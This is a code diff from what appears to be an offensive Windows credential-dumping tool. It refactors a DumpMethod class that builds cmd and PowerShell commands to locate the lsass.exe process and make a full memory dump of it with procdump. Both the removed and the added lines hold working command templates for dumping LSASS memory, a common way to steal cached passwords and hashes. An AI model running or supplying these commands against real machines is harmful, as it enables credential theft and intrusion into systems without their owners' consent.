@@ -21,12 +21,12 @@ class DumpMethod(IDumpMethod):
         self.clean_dependencies([self.procdump])
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
-        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
-            self.procdump.remote_path, self.procdump.file,
+        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} -accepteula -o -ma %J {}{}""".format(
+            self.procdump.get_remote_path(),
             self.dump_path, self.dump_name
         )
-        pwsh_command = """{}{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
-            self.procdump.remote_path, self.procdump.file,
+        pwsh_command = """{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
+            self.procdump.get_remote_path(),
             self.dump_path, self.dump_name
         )
         return {
